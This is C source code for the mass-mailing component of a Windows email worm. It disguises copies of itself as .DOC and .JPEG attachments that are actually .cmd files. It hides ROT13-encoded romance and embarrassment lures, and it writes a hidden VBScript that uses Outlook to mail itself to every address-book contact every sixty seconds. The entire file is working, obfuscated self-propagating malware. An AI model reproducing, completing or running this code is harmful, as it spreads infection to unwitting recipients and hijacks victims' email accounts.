#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>
#define MailTimeout 60 // 60 Second intervals per mass mail bursts

int MassMailMain(void)
{
	char Subject[100], Message[512], Attachment[100], MyPath[100], VBSFile[50], RanNu[20];
	unsigned char VBS_Mail[2000];

	while(1) {
		memset(Subject,0,sizeof(Subject));
		memset(Message,0,sizeof(Message));
		memset(Attachment,0,sizeof(Attachment));
		memset(MyPath,0,sizeof(MyPath));
		memset(VBS_Mail,0,sizeof(VBS_Mail));
		memset(VBSFile,0,sizeof(VBSFile));
		memset(RanNu,0,sizeof(RanNu));

		srand(GetTickCount());
		sprintf(RanNu,"\\mailer.vbs");
		GetEnvironmentVariable("HOMEDRIVE",Attachment,sizeof(Attachment));
		strcpy(VBSFile,Attachment);
		strcat(VBSFile,RanNu);
		GetModuleFileName(NULL,MyPath,sizeof(MyPath));

		switch(rand()%5) {
			case 0:
				strcpy(Subject,"Zl cnffvbangr ybir gbjneqf lbh"); // My passionate love towards you
				strcpy(Message,"Zl ybiryrggre sbe lbh vf va gur nggnpurq qbphzrag. =)"); // My loveletter for you is in the attached document. =)
				strcat(Attachment,"\\LoveYouLife.TMP.DOC.cmd");
				CopyFile(MyPath,Attachment,FALSE);
				CiphStr(Attachment,Attachment);
				break;
			case 1:
				strcpy(Subject,"Lbh bjr zr ovt gvzr"); // You owe me big time
				strcpy(Message,"Lbh pna'g whfg sbetrg nobhg gur ovyy lbh yrsg zr jvgu. V nggnpurq gb gur qbphzragf nf cebbs lbh bjr zr."); // You can't just forget about the bill you left me with. I attached to the documents as proof you owe me.
				strcat(Attachment,"\\DocumentsPay.TMP.DOC.cmd");
				CopyFile(MyPath,Attachment,FALSE);
				CiphStr(Attachment,Attachment);
				break;
			case 2:
				strcpy(Subject,"Url! Purpx guvf bhg!"); // Hey! Check this out!
				strcpy(Message,"V guvax gung'f lbh va guvf cvpgher, ubj rzonerffvat!"); // I think that's you in this picture, how embaressing!
				strcat(Attachment,"\\PartyTips.TMP.JPEG.cmd");
				CopyFile(MyPath,Attachment,FALSE);
				CiphStr(Attachment,Attachment);
				break;
			case 3:
				strcpy(Subject,"Vf gung lbh?"); // Is that you?
				strcpy(Message,"V erpnyy lbh orvat va guvf cvpgher, juvpu crefba ner lbh?"); // I recall you being in this picture, which person are you?
				strcat(Attachment,"\\BeachPicture.TMP.JPEG.cmd");
				CopyFile(MyPath,Attachment,FALSE);
				CiphStr(Attachment,Attachment);
				break;
			case 4:
				strcpy(Subject,"V YBIR LBH!"); // I LOVE YOU!
				strcpy(Message,"Cyrnfr ernq gur nggnpurq ybir yrggre sebz zr. ;)"); // Please read the attached love letter from me. ;)
				strcat(Attachment,"\\LoveLetter.TMP.DOC.cmd");
				CopyFile(MyPath,Attachment,FALSE);
				CiphStr(Attachment,Attachment);
				break;
		}
		sprintf(VBS_Mail,
			"qvz k\r\n"
			"erz\r\n"
			"ba reebe erfhzr arkg\r\n"
			"erz\r\n"
			"Frg sfb =\"Fpevcgvat.SvyrFlfgrz.Bowrpg\"\r\n"
			"erz\r\n"
			"Frg fb=PerngrBowrpg(sfb)\r\n"
			"erz\r\n"
			"Frg by=PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
			"erz\r\n"
			"Frg bhg=JFpevcg.PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
			"erz\r\n"
			"Frg zncv = bhg.TrgAnzrFcnpr(\"ZNCV\")\r\n"
			"erz\r\n"
			"Frg n = zncv.NqqerffYvfgf(1)\r\n"
			"erz\r\n"
			"Frg nr=n.NqqerffRagevrf\r\n"
			"erz\r\n"
			"Sbe k=1 Gb nr.Pbhag\r\n"
			"erz\r\n"
			"Frg pv=by.PerngrVgrz(0)\r\n"
			"erz\r\n"
			"Frg Znvy=pv\r\n"
			"erz\r\n"
			"Znvy.gb=by.TrgAnzrFcnpr(\"ZNCV\").NqqerffYvfgf(1).NqqerffRagevrf(k)\r\n"
			"erz\r\n"
			"Znvy.Fhowrpg=\"%s\"\r\n"
			"erz\r\n"
			"Znvy.Obql=\"%s\"\r\n"
			"erz\r\n"
			"Znvy.Nggnpuzragf.Nqq(\"%s\")\r\n"
			"erz\r\n"
			"Znvy.fraq\r\n"
			"erz\r\n"
			"Arkg\r\n"
			"erz\r\n"
			"by.Dhvg\r\n",
			Subject,Message,Attachment);
		CiphStr(VBS_Mail,VBS_Mail);

		FILE *file = fopen(VBSFile,"wb");
		fputs(VBS_Mail,file);
		fclose(file);
		ShellExecute(NULL,"open",VBSFile,NULL,NULL,SW_HIDE);
		Sleep(MailTimeout*1000);
	}
	return 0;
}